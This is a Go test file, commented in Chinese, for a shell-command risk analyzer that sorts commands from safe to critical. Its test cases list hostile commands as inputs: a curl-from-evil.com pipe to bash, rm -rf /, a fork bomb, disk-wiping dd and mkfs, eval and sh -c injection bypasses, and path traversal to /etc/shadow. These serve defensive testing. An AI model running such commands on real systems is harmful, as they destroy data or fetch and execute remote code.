package safety

import (
	"os"
	"path/filepath"
	"testing"
)

// TestAnalyzeCommand_BypassAttacks 测试各种命令注入绕过攻击是否被正确拦截
func TestAnalyzeCommand_BypassAttacks(t *testing.T) {
	analyzer := NewCommandAnalyzer()

	tests := []struct {
		name    string
		cmd     string
		minRisk RiskLevel // 期望的最低风险等级
	}{
		// === 命令注入绕过测试 ===
		{"sh -c 执行 rm", `sh -c "rm -rf /"`, RiskLevelCritical},
		{"bash -c 执行 rm", `bash -c "rm -rf /tmp"`, RiskLevelCritical},
		{"echo 管道 bash", `echo "rm -rf /" | bash`, RiskLevelHigh},
		{"curl 管道 bash", `curl http://evil.com/script.sh | bash`, RiskLevelMedium},
		{"curl 管道 sh", `curl http://evil.com/script.sh | sh`, RiskLevelMedium},
		{"xargs rm", `find /tmp -name "*.log" | xargs rm`, RiskLevelCritical},
		{"sudo rm", `sudo rm -rf /var/log`, RiskLevelCritical},
		{"eval 注入", `eval "rm -rf /"`, RiskLevelHigh},
		{"source 脚本", `source /tmp/evil.sh`, RiskLevelHigh},

		// === 危险模式测试 ===
		{"rm -rf /", `rm -rf /`, RiskLevelCritical},
		{"rm -rf ..", `rm -rf ..`, RiskLevelCritical},
		{"mkfs", `mkfs.ext4 /dev/sda`, RiskLevelCritical},
		{"dd 写设备", `dd if=/dev/zero of=/dev/sda`, RiskLevelCritical},
		{"fork bomb", `:(){ :|:& };:`, RiskLevelCritical},

		// === find -exec 测试 ===
		{"find -exec rm", `find / -exec rm {} \;`, RiskLevelCritical},
		{"find -execdir mv", `find /tmp -execdir mv {} /dev/null \;`, RiskLevelCritical},

		// === 中等风险命令 ===
		{"curl 下载", `curl http://example.com/file.sh`, RiskLevelMedium},
		{"wget 下载", `wget http://example.com/file.sh`, RiskLevelMedium},
		{"chmod", `chmod 755 /etc/passwd`, RiskLevelMedium},
		{"chown", `chown root:root /etc/shadow`, RiskLevelMedium},
		{"mv 文件", `mv /etc/passwd /etc/passwd.bak`, RiskLevelMedium},
		{"重定向写入", `echo "data" > /etc/passwd`, RiskLevelMedium},

		// === 安全命令 ===
		{"uptime", `uptime`, RiskLevelSafe},
		{"free -h", `free -h`, RiskLevelSafe},
		{"df -h", `df -h`, RiskLevelSafe},
		{"ps aux", `ps aux`, RiskLevelSafe},
		{"grep 日志", `grep "error" /var/log/syslog`, RiskLevelSafe},
		{"docker ps", `docker ps`, RiskLevelSafe},
		{"kubectl get pods", `kubectl get pods -n kube-system`, RiskLevelSafe},

		// === 管道组合 ===
		{"安全管道", `ps aux | grep nginx`, RiskLevelLow},
		{"含危险的管道", `cat /etc/passwd | rm -rf /tmp`, RiskLevelCritical},

		// === sed -i 测试 ===
		{"sed -i 原地修改", `sed -i 's/old/new/g' /etc/hosts`, RiskLevelCritical},

		// === 路径遍历 ===
		{"路径遍历", `cat ../../etc/shadow`, RiskLevelHigh},

		// === /dev/null 重定向不应误判（关键修复）===
		{"2>/dev/null 丢弃stderr", `du -sh /* 2>/dev/null | sort -rh | head -20`, RiskLevelSafe},
		{">/dev/null 丢弃stdout", `find / -name "*.log" 2>/dev/null`, RiskLevelSafe},

		// === 多义工具子命令分级（docker / kubectl / systemctl） ===
		// 变更类子命令必须 High（曾出现 docker rm -f 直接执行的安全 bug）
		{"docker rm", `docker rm drugcontrol-propaganda`, RiskLevelHigh},
		{"docker rm -f", `docker rm -f drugcontrol-propaganda`, RiskLevelHigh},
		{"docker stop", `docker stop nginx`, RiskLevelHigh},
		{"docker kill", `docker kill nginx`, RiskLevelHigh},
		{"docker exec", `docker exec -it web sh`, RiskLevelHigh},
		{"docker run", `docker run nginx`, RiskLevelHigh},
		{"kubectl delete", `kubectl delete pod foo`, RiskLevelHigh},
		{"kubectl delete -f", `kubectl delete -f deploy.yaml`, RiskLevelHigh},
		{"systemctl stop", `systemctl stop nginx`, RiskLevelHigh},
		{"systemctl restart", `systemctl restart sshd`, RiskLevelHigh},
		{"systemctl disable", `systemctl disable nginx`, RiskLevelHigh},

		// 只读子命令仍应 Safe
		{"docker inspect", `docker inspect foo --format '{{json .State}}'`, RiskLevelSafe},
		{"docker logs", `docker logs --tail 50 web`, RiskLevelSafe},
		{"docker stats", `docker stats --no-stream`, RiskLevelSafe},
		{"kubectl describe", `kubectl describe pod foo`, RiskLevelSafe},
		{"systemctl status", `systemctl status nginx`, RiskLevelSafe},
		{"systemctl is-active", `systemctl is-active nginx`, RiskLevelSafe},

		// === sysctl 分级 ===
		// 写入参数必须 Medium（曾被误判 Low 直接执行）
		{"sysctl 写参数", `sysctl vm.swappiness=10`, RiskLevelMedium},
		{"sysctl -w", `sysctl -w vm.swappiness=10`, RiskLevelMedium},
		{"sysctl --system", `sysctl --system`, RiskLevelMedium},
		// 纯读取仍应 Safe
		{"sysctl 读参数", `sysctl vm.swappiness`, RiskLevelSafe},
		{"sysctl -a", `sysctl -a`, RiskLevelSafe},
		{"sysctl -n", `sysctl -n kernel.hostname`, RiskLevelSafe},

		// === 未知命令默认 Medium（曾为 Low，直接执行不询问不安全）===
		{"未知命令", `some-unknown-binary --flag value`, RiskLevelMedium},
		{"2>&1 合并重定向", `ls -la /nonexist 2>&1`, RiskLevelSafe},
		// 真正的文件写入仍应检测
		{"写入文件", `echo "data" > /tmp/test.txt`, RiskLevelMedium},
		{"追加文件", `echo "log" >> /var/log/custom.log`, RiskLevelMedium},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			info := analyzer.AnalyzeCommand(tt.cmd)
			if info.RiskLevel < tt.minRisk {
				t.Errorf("命令 %q 风险等级为 %d，期望至少 %d (原因: %s)",
					tt.cmd, info.RiskLevel, tt.minRisk, info.Reason)
			}
		})
	}
}

// TestAnalyzeCommand_SafeCommands 验证安全命令确实被判定为 Safe
func TestAnalyzeCommand_SafeCommands(t *testing.T) {
	analyzer := NewCommandAnalyzer()
	safeCmds := []string{
		"uptime", "free -h", "df -h", "ps aux", "ls -la",
		"cat /etc/os-release", "uname -a", "hostname",
		"docker ps", "kubectl get nodes", "journalctl -n 50",
	}

	for _, cmd := range safeCmds {
		info := analyzer.AnalyzeCommand(cmd)
		if info.RiskLevel != RiskLevelSafe {
			t.Errorf("安全命令 %q 被误判为风险等级 %d (原因: %s)",
				cmd, info.RiskLevel, info.Reason)
		}
	}
}

// TestAnalyzeCommand_EmptyAndEdgeCases 边界情况测试
func TestAnalyzeCommand_EmptyAndEdgeCases(t *testing.T) {
	analyzer := NewCommandAnalyzer()

	// 空命令
	info := analyzer.AnalyzeCommand("")
	if info.RiskLevel != RiskLevelSafe {
		t.Errorf("空命令应判定为 Safe，实际为 %d", info.RiskLevel)
	}

	// 纯空格
	info = analyzer.AnalyzeCommand("   ")
	if info.RiskLevel != RiskLevelSafe {
		t.Errorf("纯空格命令应判定为 Safe，实际为 %d", info.RiskLevel)
	}
}

// TestLoadWhitelist_MergeNotReplace 验证白名单加载是合并而非替换。
// 修复前的 bug：LoadWhitelist 直接用文件内容覆盖 safeCommands，
// 导致用户 whitelist.txt 不完整时，内置的 lsof/tcpdump 等被误判为未知命令。
func TestLoadWhitelist_MergeNotReplace(t *testing.T) {
	// 保存原始状态，测试后恢复
	origSafe := append([]string(nil), safeCommands...)
	defer func() {
		safeCommands = origSafe
		rebuildSafeCommandSet()
	}()

	// 写一个只含少量命令的白名单文件
	tmpDir := t.TempDir()
	wlFile := filepath.Join(tmpDir, "whitelist.txt")
	content := "# 测试白名单\nfoo_custom\nbar_custom\nuptime\n\n# 注释\n"
	if err := os.WriteFile(wlFile, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	if err := LoadWhitelist(wlFile); err != nil {
		t.Fatalf("LoadWhitelist 失败: %v", err)
	}

	// 1. 内置命令仍应判定为 Safe（未被覆盖）
	analyzer := NewCommandAnalyzer()
	for _, builtin := range []string{"lsof", "tcpdump", "df", "uptime"} {
		info := analyzer.AnalyzeCommand(builtin)
		if info.RiskLevel != RiskLevelSafe {
			t.Errorf("内置命令 %q 加载白名单后被误判为 %d（应保持 Safe，说明合并逻辑失效）",
				builtin, info.RiskLevel)
		}
	}

	// 2. 用户新增的命令应被合并进来，判定为 Safe
	for _, custom := range []string{"foo_custom", "bar_custom"} {
		info := analyzer.AnalyzeCommand(custom)
		if info.RiskLevel != RiskLevelSafe {
			t.Errorf("用户白名单命令 %q 未被合并，判定为 %d（应 Safe）",
				custom, info.RiskLevel)
		}
	}

	// 3. 合并后总命令数 = 内置数 + 用户独有数（foo/bar），重复的 uptime 不应重复计数
	//    这验证了去重逻辑
	duplicates := make(map[string]int)
	for _, c := range safeCommands {
		duplicates[c]++
	}
	for cmd, n := range duplicates {
		if n > 1 {
			t.Errorf("命令 %q 在合并后出现 %d 次（应去重）", cmd, n)
		}
	}
}

// TestAnalyzeCommand_HostMutatingTools 主机变更类工具的分级覆盖测试。
// 这些工具都有"读"和"写"两种形态，必须按子命令区分，否则会引发灾难。
//   - ip / iptables / firewall-cmd / ufw / nft / ipset：网络配置变更
//   - hostnamectl / timedatectl / localectl / crontab：系统设置变更
//   - sysctl：已在 BypassAttacks 覆盖，这里不重复
func TestAnalyzeCommand_HostMutatingTools(t *testing.T) {
	analyzer := NewCommandAnalyzer()

	tests := []struct {
		name    string
		cmd     string
		minRisk RiskLevel
	}{
		// === ip 命令 ===
		{"ip addr show", `ip addr show`, RiskLevelSafe},
		{"ip route list", `ip route list`, RiskLevelSafe},
		{"ip link show", `ip link show`, RiskLevelSafe},
		{"ip -j addr", `ip -j addr`, RiskLevelSafe},
		{"ip addr add", `ip addr add 10.0.0.1/24 dev eth0`, RiskLevelHigh},
		{"ip addr del", `ip addr del 10.0.0.1/24 dev eth0`, RiskLevelHigh},
		{"ip link set", `ip link set eth0 up`, RiskLevelHigh},
		{"ip route add", `ip route add default via 10.0.0.1`, RiskLevelHigh},
		{"ip route del", `ip route del default`, RiskLevelHigh},
		{"ip neigh flush", `ip neigh flush dev eth0`, RiskLevelHigh},
		{"ip 未知子命令", `ip foo`, RiskLevelMedium},

		// === iptables ===
		{"iptables -L", `iptables -L`, RiskLevelSafe},
		{"iptables -S", `iptables -S`, RiskLevelSafe},
		{"iptables -n -L", `iptables -n -L INPUT`, RiskLevelSafe},
		{"iptables -A", `iptables -A INPUT -j DROP`, RiskLevelHigh},
		{"iptables -D", `iptables -D INPUT 1`, RiskLevelHigh},
		{"iptables -F", `iptables -F`, RiskLevelHigh},
		{"iptables -Z", `iptables -Z`, RiskLevelHigh},
		{"iptables -P", `iptables -P INPUT DROP`, RiskLevelHigh},
		{"iptables -I", `iptables -I INPUT 1 -j DROP`, RiskLevelHigh},
		{"iptables -R", `iptables -R INPUT 1 -j ACCEPT`, RiskLevelHigh},
		{"iptables 未知子命令", `iptables --foo bar`, RiskLevelMedium},

		// === firewall-cmd (firewalld) ===
		{"firewall-cmd --list-all", `firewall-cmd --list-all`, RiskLevelSafe},
		{"firewall-cmd --list-ports", `firewall-cmd --list-ports`, RiskLevelSafe},
		{"firewall-cmd --add-port", `firewall-cmd --add-port=8080/tcp`, RiskLevelHigh},
		{"firewall-cmd --remove-port", `firewall-cmd --remove-port=8080/tcp`, RiskLevelHigh},
		{"firewall-cmd --add-service", `firewall-cmd --add-service=http`, RiskLevelHigh},
		{"firewall-cmd --permanent --add-port", `firewall-cmd --permanent --add-port=8080/tcp`, RiskLevelHigh},
		{"firewall-cmd --reload", `firewall-cmd --reload`, RiskLevelHigh},
		{"firewall-cmd --panic-on", `firewall-cmd --panic-on`, RiskLevelHigh},

		// === ufw ===
		{"ufw status", `ufw status`, RiskLevelSafe},
		{"ufw status verbose", `ufw status verbose`, RiskLevelSafe},
		{"ufw allow", `ufw allow 80/tcp`, RiskLevelHigh},
		{"ufw deny", `ufw deny 80/tcp`, RiskLevelHigh},
		{"ufw delete", `ufw delete allow 80/tcp`, RiskLevelHigh},
		{"ufw enable", `ufw enable`, RiskLevelHigh},
		{"ufw disable", `ufw disable`, RiskLevelHigh},
		{"ufw reload", `ufw reload`, RiskLevelHigh},
		{"ufw reset", `ufw reset`, RiskLevelHigh},

		// === nft ===
		{"nft list ruleset", `nft list ruleset`, RiskLevelSafe},
		{"nft add rule", `nft add rule filter input tcp dport 22 accept`, RiskLevelHigh},
		{"nft delete rule", `nft delete rule filter input handle 10`, RiskLevelHigh},
		{"nft flush", `nft flush ruleset`, RiskLevelHigh},
		{"nft add table", `nft add table ip filter`, RiskLevelHigh},
		{"nft delete table", `nft delete table ip filter`, RiskLevelHigh},

		// === ipset ===
		{"ipset list", `ipset list`, RiskLevelSafe},
		{"ipset add", `ipset add blacklist 1.2.3.4`, RiskLevelHigh},
		{"ipset del", `ipset del blacklist 1.2.3.4`, RiskLevelHigh},
		{"ipset create", `ipset create blacklist hash:ip`, RiskLevelHigh},
		{"ipset destroy", `ipset destroy blacklist`, RiskLevelHigh},
		{"ipset flush", `ipset flush blacklist`, RiskLevelHigh},

		// === hostnamectl ===
		{"hostnamectl status", `hostnamectl status`, RiskLevelSafe},
		{"hostnamectl set-hostname", `hostnamectl set-hostname web01`, RiskLevelHigh},
		{"hostnamectl 未知子命令", `hostnamectl --foo`, RiskLevelMedium},

		// === timedatectl ===
		{"timedatectl status", `timedatectl status`, RiskLevelSafe},
		{"timedatectl timesync-status", `timedatectl timesync-status`, RiskLevelSafe},
		{"timedatectl set-timezone", `timedatectl set-timezone Asia/Shanghai`, RiskLevelHigh},
		{"timedatectl set-time", `timedatectl set-time "2025-01-01 00:00:00"`, RiskLevelHigh},
		{"timedatectl set-ntp", `timedatectl set-ntp true`, RiskLevelHigh},

		// === localectl ===
		{"localectl status", `localectl status`, RiskLevelSafe},
		{"localectl set-locale", `localectl set-locale LANG=en_US.UTF-8`, RiskLevelHigh},
		{"localectl set-keymap", `localectl set-keymap us`, RiskLevelHigh},

		// === crontab ===
		{"crontab -l", `crontab -l`, RiskLevelSafe},
		{"crontab -e", `crontab -e`, RiskLevelHigh},
		{"crontab -r", `crontab -r`, RiskLevelHigh},
		{"crontab file", `crontab /tmp/cron`, RiskLevelMedium},
		{"crontab 未知 flag", `crontab --foo`, RiskLevelMedium},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			info := analyzer.AnalyzeCommand(tt.cmd)
			if info.RiskLevel < tt.minRisk {
				t.Errorf("命令 %q 风险等级为 %d，期望至少 %d (原因: %s)",
					tt.cmd, info.RiskLevel, tt.minRisk, info.Reason)
			}
		})
	}
}

// TestAnalyzeCommand_ContainerOrchestrators 容器编排与镜像工具分级覆盖测试。
//
//	docker compose / docker-compose / kubectl 子命令空间分层
//	helm / kubeadm / etcdctl / crictl / ctr / nerdctl / podman
func TestAnalyzeCommand_ContainerOrchestrators(t *testing.T) {
	analyzer := NewCommandAnalyzer()

	tests := []struct {
		name    string
		cmd     string
		minRisk RiskLevel
	}{
		// === docker compose（复合子命令）===
		{"docker compose ps", `docker compose ps`, RiskLevelSafe},
		{"docker compose ls", `docker compose ls`, RiskLevelSafe},
		{"docker compose config", `docker compose config`, RiskLevelSafe},
		{"docker compose top", `docker compose top`, RiskLevelSafe},
		{"docker compose up", `docker compose up -d`, RiskLevelHigh},
		{"docker compose down", `docker compose down`, RiskLevelHigh},
		{"docker compose restart", `docker compose restart`, RiskLevelHigh},
		{"docker compose stop", `docker compose stop`, RiskLevelHigh},
		{"docker compose kill", `docker compose kill`, RiskLevelHigh},
		{"docker compose rm", `docker compose rm -f`, RiskLevelHigh},
		{"docker compose exec", `docker compose exec web sh`, RiskLevelHigh},
		{"docker compose run", `docker compose run web sh`, RiskLevelHigh},

		// === docker-compose（独立二进制，旧版）===
		{"docker-compose ps", `docker-compose ps`, RiskLevelSafe},
		{"docker-compose up", `docker-compose up -d`, RiskLevelHigh},
		{"docker-compose down", `docker-compose down`, RiskLevelHigh},
		{"docker-compose kill", `docker-compose kill`, RiskLevelHigh},
		{"docker-compose rm", `docker-compose rm -f`, RiskLevelHigh},

		// === helm ===
		{"helm list", `helm list`, RiskLevelSafe},
		{"helm status", `helm status my-release`, RiskLevelSafe},
		{"helm get values", `helm get values my-release`, RiskLevelSafe},
		{"helm install", `helm install my-release bitnami/nginx`, RiskLevelHigh},
		{"helm upgrade", `helm upgrade my-release bitnami/nginx`, RiskLevelHigh},
		{"helm uninstall", `helm uninstall my-release`, RiskLevelHigh},
		{"helm rollback", `helm rollback my-release 1`, RiskLevelHigh},
		{"helm package", `helm package ./chart`, RiskLevelHigh},
		{"helm push", `helm push my-chart-0.1.0.tgz oci://registry`, RiskLevelHigh},
		{"helm pull", `helm pull bitnami/nginx`, RiskLevelMedium}, // -w --untar 会写文件
		{"helm 未知子命令", `helm foo`, RiskLevelMedium},

		// === kubeadm ===
		{"kubeadm token list", `kubeadm token list`, RiskLevelSafe},
		{"kubeadm config view", `kubeadm config view`, RiskLevelSafe},
		{"kubeadm config print", `kubeadm config print init-defaults`, RiskLevelSafe},
		{"kubeadm init", `kubeadm init --pod-network-cidr=10.244.0.0/16`, RiskLevelHigh},
		{"kubeadm reset", `kubeadm reset`, RiskLevelHigh},
		{"kubeadm join", `kubeadm join 10.0.0.1:6443 --token xxx`, RiskLevelHigh},
		{"kubeadm token create", `kubeadm token create`, RiskLevelHigh},
		{"kubeadm token delete", `kubeadm token delete abcdef.abcdef`, RiskLevelHigh},
		{"kubeadm upgrade apply", `kubeadm upgrade apply v1.30.0`, RiskLevelHigh},

		// === etcdctl ===
		{"etcdctl get", `etcdctl get /foo`, RiskLevelSafe},
		{"etcdctl endpoint status", `etcdctl endpoint status`, RiskLevelSafe},
		{"etcdctl member list", `etcdctl member list`, RiskLevelSafe},
		{"etcdctl put", `etcdctl put /foo bar`, RiskLevelHigh},
		{"etcdctl del", `etcdctl del /foo`, RiskLevelHigh},
		{"etcdctl member remove", `etcdctl member remove abc`, RiskLevelHigh},
		{"etcdctl member add", `etcdctl member add node3`, RiskLevelHigh},
		{"etcdctl snapshot save", `etcdctl snapshot save /tmp/snap.db`, RiskLevelHigh},
		{"etcdctl snapshot restore", `etcdctl snapshot restore /tmp/snap.db`, RiskLevelHigh},

		// === crictl ===
		{"crictl ps", `crictl ps`, RiskLevelSafe},
		{"crictl images", `crictl images`, RiskLevelSafe},
		{"crictl inspect", `crictl inspect <id>`, RiskLevelSafe},
		{"crictl logs", `crictl logs <id>`, RiskLevelSafe},
		{"crictl stats", `crictl stats`, RiskLevelSafe},
		{"crictl rm", `crictl rm <id>`, RiskLevelHigh},
		{"crictl rmi", `crictl rmi nginx`, RiskLevelHigh},
		{"crictl exec", `crictl exec <id> ls`, RiskLevelHigh},
		{"crictl pull", `crictl pull nginx`, RiskLevelHigh},
		{"crictl stop", `crictl stop <id>`, RiskLevelHigh},
		{"crictl 未知子命令", `crictl foo`, RiskLevelMedium},

		// === ctr (containerd) ===
		{"ctr images ls", `ctr images ls`, RiskLevelSafe},
		{"ctr containers ls", `ctr containers ls`, RiskLevelSafe},
		{"ctr tasks ls", `ctr tasks ls`, RiskLevelSafe},
		{"ctr info", `ctr info`, RiskLevelSafe},
		{"ctr version", `ctr version`, RiskLevelSafe},
		{"ctr images pull", `ctr images pull docker.io/nginx:latest`, RiskLevelHigh},
		{"ctr images rm", `ctr images rm nginx:latest`, RiskLevelHigh},
		{"ctr containers create", `ctr containers create nginx:latest web`, RiskLevelHigh},
		{"ctr containers rm", `ctr containers rm web`, RiskLevelHigh},
		{"ctr tasks start", `ctr tasks start web`, RiskLevelHigh},
		{"ctr tasks kill", `ctr tasks kill web`, RiskLevelHigh},
		{"ctr tasks delete", `ctr tasks delete web`, RiskLevelHigh},
		{"ctr run", `ctr run nginx:latest web`, RiskLevelHigh},
		{"ctr 未知子命令", `ctr foo`, RiskLevelMedium},

		// === nerdctl ===
		{"nerdctl ps", `nerdctl ps`, RiskLevelSafe},
		{"nerdctl images", `nerdctl images`, RiskLevelSafe},
		{"nerdctl inspect", `nerdctl inspect nginx`, RiskLevelSafe},
		{"nerdctl logs", `nerdctl logs web`, RiskLevelSafe},
		{"nerdctl stats", `nerdctl stats`, RiskLevelSafe},
		{"nerdctl rm", `nerdctl rm web`, RiskLevelHigh},
		{"nerdctl rmi", `nerdctl rmi nginx`, RiskLevelHigh},
		{"nerdctl stop", `nerdctl stop web`, RiskLevelHigh},
		{"nerdctl kill", `nerdctl kill web`, RiskLevelHigh},
		{"nerdctl exec", `nerdctl exec web sh`, RiskLevelHigh},
		{"nerdctl run", `nerdctl run nginx`, RiskLevelHigh},
		{"nerdctl pull", `nerdctl pull nginx`, RiskLevelHigh},
		{"nerdctl push", `nerdctl push myimg:latest`, RiskLevelHigh},
		{"nerdctl compose up", `nerdctl compose up -d`, RiskLevelHigh},
		{"nerdctl compose down", `nerdctl compose down`, RiskLevelHigh},

		// === podman ===
		{"podman ps", `podman ps`, RiskLevelSafe},
		{"podman images", `podman images`, RiskLevelSafe},
		{"podman inspect", `podman inspect nginx`, RiskLevelSafe},
		{"podman logs", `podman logs web`, RiskLevelSafe},
		{"podman stats", `podman stats`, RiskLevelSafe},
		{"podman rm", `podman rm web`, RiskLevelHigh},
		{"podman rmi", `podman rmi nginx`, RiskLevelHigh},
		{"podman stop", `podman stop web`, RiskLevelHigh},
		{"podman kill", `podman kill web`, RiskLevelHigh},
		{"podman exec", `podman exec web sh`, RiskLevelHigh},
		{"podman run", `podman run nginx`, RiskLevelHigh},
		{"podman compose up", `podman compose up -d`, RiskLevelHigh},
		{"podman compose down", `podman compose down`, RiskLevelHigh},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			info := analyzer.AnalyzeCommand(tt.cmd)
			if info.RiskLevel < tt.minRisk {
				t.Errorf("命令 %q 风险等级为 %d，期望至少 %d (原因: %s)",
					tt.cmd, info.RiskLevel, tt.minRisk, info.Reason)
			}
		})
	}
}

// TestAnalyzeCommand_DangerousAndMedium 覆盖 dangerousCommands 与 mediumRiskCommands
// 两个整命令一视分级列表的扩展项。
func TestAnalyzeCommand_DangerousAndMedium(t *testing.T) {
	analyzer := NewCommandAnalyzer()

	tests := []struct {
		name    string
		cmd     string
		minRisk RiskLevel
	}{
		// === dangerousCommands 新增项（Critical）===
		{"userdel", `userdel -r bob`, RiskLevelCritical},
		{"usermod -G", `usermod -G sudo bob`, RiskLevelCritical},
		{"groupdel", `groupdel dev`, RiskLevelCritical},
		{"lvremove", `lvremove /dev/vg0/lv1`, RiskLevelCritical},
		{"vgremove", `vgremove vg0`, RiskLevelCritical},
		{"pvremove", `pvremove /dev/sdb`, RiskLevelCritical},
		{"vgexport", `vgexport vg0`, RiskLevelCritical},
		{"vgimport", `vgimport vg0`, RiskLevelCritical},
		{"lvextend", `lvextend -L+10G /dev/vg0/lv1`, RiskLevelCritical},
		{"lvreduce", `lvreduce -L-5G /dev/vg0/lv1`, RiskLevelCritical},
		{"lvcreate", `lvcreate -L 10G -n lv1 vg0`, RiskLevelCritical},
		{"vgcreate", `vgcreate vg0 /dev/sdb`, RiskLevelCritical},
		{"pvcreate", `pvcreate /dev/sdb`, RiskLevelCritical},
		{"xfs_growfs", `xfs_growfs /mnt`, RiskLevelCritical},
		{"resize2fs", `resize2fs /dev/vg0/lv1`, RiskLevelCritical},
		{"modprobe -r", `modprobe -r nfs`, RiskLevelCritical},
		{"rmmod", `rmmod nfs`, RiskLevelCritical},
		{"insmod", `insmod /tmp/mymod.ko`, RiskLevelCritical},
		{"setcap", `setcap cap_net_admin+ep /bin/bash`, RiskLevelCritical},

		// === mediumRiskCommands 新增项（Medium）===
		{"tc qdisc show", `tc qdisc show`, RiskLevelMedium},
		{"tc qdisc add", `tc qdisc add dev eth0 root netem delay 100ms`, RiskLevelMedium},
		{"ethtool -S", `ethtool -S eth0`, RiskLevelMedium},
		{"ethtool -s", `ethtool -s eth0 speed 1000`, RiskLevelMedium},
		{"route -n", `route -n`, RiskLevelMedium},
		{"route add", `route add default gw 10.0.0.1`, RiskLevelMedium},
		{"tee 写入", `echo foo | tee /etc/foo`, RiskLevelMedium},
		{"tar -x", `tar -xvf foo.tar.gz`, RiskLevelMedium},
		{"tar -c", `tar -cvf out.tar /etc`, RiskLevelMedium},
		{"zip", `zip out.zip foo bar`, RiskLevelMedium},
		{"unzip", `unzip foo.zip`, RiskLevelMedium},
		{"gzip", `gzip large.log`, RiskLevelMedium},
		{"gunzip", `gunzip large.log.gz`, RiskLevelMedium},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			info := analyzer.AnalyzeCommand(tt.cmd)
			if info.RiskLevel < tt.minRisk {
				t.Errorf("命令 %q 风险等级为 %d，期望至少 %d (原因: %s)",
					tt.cmd, info.RiskLevel, tt.minRisk, info.Reason)
			}
		})
	}
}

// TestAnalyzeCommand_EdgeCases 边界情况覆盖测试。
// 这些用例都是在实际审查中发现的安全漏洞修复后的回归测试。
func TestAnalyzeCommand_EdgeCases(t *testing.T) {
	analyzer := NewCommandAnalyzer()

	tests := []struct {
		name    string
		cmd     string
		minRisk RiskLevel
	}{
		// === docker 命名空间子命令（曾误判 Safe 的严重 bug）===
		// docker network/volume/container/image/system 曾作为单参数放在 readOnly 中，
		// 导致 `docker network rm` 命中 readOnly["network"] 直接返回 Safe。
		// 修复：改为复合子命令形式 "network rm" / "network ls" 精确匹配。
		{"docker network rm", `docker network rm mynet`, RiskLevelHigh},
		{"docker network create", `docker network create mynet`, RiskLevelHigh},
		{"docker network prune", `docker network prune`, RiskLevelHigh},
		{"docker network disconnect", `docker network disconnect web mynet`, RiskLevelHigh},
		{"docker volume rm", `docker volume rm myvol`, RiskLevelHigh},
		{"docker volume create", `docker volume create myvol`, RiskLevelHigh},
		{"docker volume prune", `docker volume prune`, RiskLevelHigh},
		{"docker container rm", `docker container rm web`, RiskLevelHigh},
		{"docker container stop", `docker container stop web`, RiskLevelHigh},
		{"docker container kill", `docker container kill web`, RiskLevelHigh},
		{"docker container exec", `docker container exec web sh`, RiskLevelHigh},
		{"docker image rm", `docker image rm nginx`, RiskLevelHigh},
		{"docker image pull", `docker image pull nginx`, RiskLevelHigh},
		{"docker image push", `docker image push myimg:latest`, RiskLevelHigh},
		{"docker system prune", `docker system prune -f`, RiskLevelHigh},
		{"docker secret rm", `docker secret rm mysecret`, RiskLevelHigh},
		{"docker config rm", `docker config rm myconfig`, RiskLevelHigh},

		// docker 命名空间只读操作仍应 Safe
		{"docker network ls", `docker network ls`, RiskLevelSafe},
		{"docker network inspect", `docker network inspect mynet`, RiskLevelSafe},
		{"docker volume ls", `docker volume ls`, RiskLevelSafe},
		{"docker volume inspect", `docker volume inspect myvol`, RiskLevelSafe},
		{"docker container ls", `docker container ls`, RiskLevelSafe},
		{"docker container inspect", `docker container inspect web`, RiskLevelSafe},
		{"docker container logs", `docker container logs web`, RiskLevelSafe},
		{"docker image ls", `docker image ls`, RiskLevelSafe},
		{"docker image inspect", `docker image inspect nginx`, RiskLevelSafe},
		{"docker image history", `docker image history nginx`, RiskLevelSafe},
		{"docker system df", `docker system df`, RiskLevelSafe},
		{"docker system info", `docker system info`, RiskLevelSafe},

		// === iptables -t table 参数（曾误判 Medium）===
		// iptables -t nat -A 中 -t 是 flag 不在表中，nat 被当作未知子命令返回 Medium。
		// 修复：循环中跳过 -t / --table 及其值。
		{"iptables -t nat -A", `iptables -t nat -A PREROUTING -j DNAT --to-destination 1.2.3.4`, RiskLevelHigh},
		{"iptables -t nat -D", `iptables -t nat -D PREROUTING 1`, RiskLevelHigh},
		{"iptables -t nat -F", `iptables -t nat -F`, RiskLevelHigh},
		{"iptables -t mangle -A", `iptables -t mangle -A OUTPUT -j MARK --set-mark 1`, RiskLevelHigh},
		{"iptables -t nat -L", `iptables -t nat -L`, RiskLevelSafe},
		{"iptables -t filter -S", `iptables -t filter -S`, RiskLevelSafe},
		{"iptables --table nat -A", `iptables --table nat -A PREROUTING -j MASQUERADE`, RiskLevelHigh},

		// === helm template/lint（曾误判 High）===
		// helm template 只生成 YAML 不变更集群；helm lint 只检查 chart 语法。
		{"helm template", `helm template mychart ./chart`, RiskLevelSafe},
		{"helm lint", `helm lint ./chart`, RiskLevelSafe},

		// === ctr content fetch（曾误判 Safe）===
		// fetch 会下载内容写入本地存储，不是纯只读。
		{"ctr content fetch", `ctr content fetch docker.io/nginx:latest`, RiskLevelHigh},

		// === ip -6 全局 flag ===
		// ip -6 addr del 应正确匹配 "addr del" 复合子命令
		{"ip -6 addr del", `ip -6 addr del fe80::1/64 dev eth0`, RiskLevelHigh},
		{"ip -6 addr show", `ip -6 addr show`, RiskLevelSafe},
		{"ip -j addr", `ip -j addr`, RiskLevelSafe},

		// === ip xfrm 三词复合子命令 ===
		// ip xfrm policy add / ip xfrm state show 需要三词复合匹配
		{"ip xfrm policy add", `ip xfrm policy add dir out tmpl src 1.2.3.4 dst 5.6.7.8`, RiskLevelHigh},
		{"ip xfrm policy del", `ip xfrm policy del dir out`, RiskLevelHigh},
		{"ip xfrm state add", `ip xfrm state add src 1.2.3.4 dst 5.6.7.8 proto esp`, RiskLevelHigh},
		{"ip xfrm state show", `ip xfrm state show`, RiskLevelSafe},
		{"ip xfrm policy show", `ip xfrm policy show`, RiskLevelSafe},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			info := analyzer.AnalyzeCommand(tt.cmd)
			if info.RiskLevel < tt.minRisk {
				t.Errorf("命令 %q 风险等级为 %d，期望至少 %d (原因: %s)",
					tt.cmd, info.RiskLevel, tt.minRisk, info.Reason)
			}
		})
	}
}
